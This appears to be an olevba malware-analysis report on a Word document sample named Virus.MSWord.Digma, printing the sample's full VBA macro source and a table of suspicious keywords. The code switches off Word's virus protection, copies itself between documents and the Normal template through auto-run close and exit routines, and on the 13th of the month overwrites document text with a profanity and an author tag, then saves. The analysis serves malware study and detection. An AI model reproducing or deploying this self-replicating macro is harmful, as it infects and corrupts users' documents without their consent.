olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Digma-df54684c67330b10c3f0e8f12d416e696a32b8d9
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Digma-df54684c67330b10c3f0e8f12d416e696a32b8d9 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO NewMacros.bas 
in file: Virus.MSWord.Digma-df54684c67330b10c3f0e8f12d416e696a32b8d9 - OLE stream: 'Macros/VBA/NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Sub autoclose()
' Virus done by DigitalMadman
   Dim ditdgfgdfhsdf As Boolean
   ditdgfgdfhsdf = False
        Options.VirusProtection = ditdgfgdfhsdf
    Application.DisplayRecentFiles = True
    RecentFiles.Maximum = 4
Dim sad, kio, yji, hjy, grt As String
Dim jlpgfjhfvbyuyurvbyrtubtuyrur5iyhtfrff As String
grt = Options.DefaultFilePath(wdCurrentFolderPath)
hjy = Options.DefaultFilePath(wdUserTemplatesPath)
If grt = hjy Then
grt = Options.DefaultFilePath(wdDocumentsPath)
End If
yji = "NewMacros"
Dim jlp, jpd, lop, sadfas As String
jpd = "\" & NormalTemplate.Name
jlp = hjy + jpd
sadfas = NormalTemplate.FullName
sad = ActiveDocument.FullName
kio = Options.DefaultFilePath(wdUserTemplatesPath)
kio = sad
jlpgfjhfvbyuyurvbyrtubtuyrur5iyhtfrff = sad
Dim fd, abc As String
Dim Notmallitems, Activitems As Byte
Dim ActiveDocitemname As String
Dim safdfasdfasdgsadgh As String
Activitems = ActiveDocument.VBProject.VBComponents.Count
Notmallitems = NormalTemplate.VBProject.VBComponents.Count
abc = Application.MacroContainer
Dim okl As Boolean
If abc = NormalTemplate.Name Then
okl = True
End If
If okl = True Then
Dim tuy As Boolean
If ActiveDocument.Name = NormalTemplate.Name Then
tuy = True
End If
If tuy = False Then
If Activitems > 1 Then
    Application.OrganizerDelete Source:=kio, Name _
        :=yji, Object:=wdOrganizerObjectProjectItems
        End If
    sad = jlpgfjhfvbyuyurvbyrtubtuyrur5iyhtfrff
   safdfasdfasdgsadgh = sad
    Application.OrganizerCopy Source:=jlp, _
    Destination:= _
       safdfasdfasdgsadgh, Name:=yji, Object _
        :=wdOrganizerObjectProjectItems
     End If
     End If
If Application.MacroContainer <> NormalTemplate.Name Then
If okl = False Then
If Notmallitems > 1 Then
    Application.OrganizerDelete Source:=jlp, _
        Name:=yji, Object:=wdOrganizerObjectProjectItems
        End If
    Application.OrganizerCopy Source:=kio, Destination:= _
        sadfas, Name:=yji, Object:= _
        wdOrganizerObjectProjectItems
        If ActiveDocument.Saved = False Then
        ActiveDocument.Save
        
        End If
        End If
End If
End Sub
Sub autoexit()
Dim hyukjnbfhgdr As String
hyukjnbfhgdr = DateTime.Date
hyukjnbfhgdr = Left(hyukjnbfhgdr, 5)
hyukjnbfhgdr = Right(hyukjnbfhgdr, 2)
If ActiveDocument.Name <> NormalTemplate.Name And ActiveDocument.Saved = True Then
If hyukjnbfhgdr = "13" Then
    Selection.Find.ClearFormatting
    Selection.Find.Replacement.ClearFormatting
    With Selection.Find
        .Text = "a"
        .Replacement.Text = "FUCK"
        .Forward = True
        .Wrap = wdFindContinue
        .Format = False
        .MatchCase = False
        .MatchWholeWord = False
        .MatchWildcards = False
        .MatchSoundsLike = False
        .MatchAllWordForms = False
    End With
    Selection.Find.Execute Replace:=wdReplaceAll
    Selection.Find.ClearFormatting
    Selection.Find.Replacement.ClearFormatting
    With Selection.Find
        .Text = "o"
        .Replacement.Text = "FUCK"
        .Forward = True
        .Wrap = wdFindContinue
        .Format = False
        .MatchCase = False
        .MatchWholeWord = False
        .MatchWildcards = False
        .MatchSoundsLike = False
        .MatchAllWordForms = False
    End With
    Selection.Find.Execute Replace:=wdReplaceAll
    Selection.GoTo What:=wdGoToLine, Which:=wdGoToFirst, Count:=1, Name:=""
    Selection.Find.ClearFormatting
    With Selection.Find
        .Text = ""
        .Replacement.Text = ""
        .Forward = True
        .Wrap = wdFindContinue
        .Format = False
        .MatchCase = False
        .MatchWholeWord = False
        .MatchWildcards = False
        .MatchSoundsLike = False
        .MatchAllWordForms = False
    End With
    Selection.Font.Size = 72
    Selection.TypeText Text:="DIGITAL MADMAN"
    Selection.TypeParagraph
ActiveDocument.Save
End If
End If
End Sub




+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexit            |Runs when the Word document is closed        |
|AutoExec  |autoclose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
